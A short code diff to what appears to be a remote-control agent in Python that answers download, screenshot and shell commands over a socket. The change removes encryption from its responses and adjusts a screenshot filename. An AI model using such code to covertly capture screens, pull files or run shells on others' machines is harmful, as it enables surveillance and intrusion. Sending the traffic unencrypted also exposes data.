@@ -55,7 +55,7 @@ def main():
 
                 print(response)
 
-                conn.sendall(cipher.encrypt_message(response))
+                conn.sendall(response)
 
             elif data['type'] == "download":
                 if not os.path.exists(data['action']):
@@ -72,8 +72,8 @@ def main():
             elif data['type'] == "screenshot":
                 now = datetime.now()
                 date = now.strftime("%d%m_%H%M")
-                # filename = f"./screenshot/screen_{date}.png"
-                filename = f"./screenshot/screen_xxx.png"
+                filename = f"./screenshot/screen_{date}.png"
+                # filename = f"./screenshot/screen_xxx.png"
 
                 screenshot = pyautogui.screenshot()
                 screenshot.save(filename)
@@ -89,7 +89,7 @@ def main():
                     file = open(filename, "rb")
                     response = file.read()
                     file.close()
-                conn.sendall(cipher.encrypt_image(response))
+                conn.sendall(response)
 
             elif data['type'] == "shell":
                 response = json.dumps({
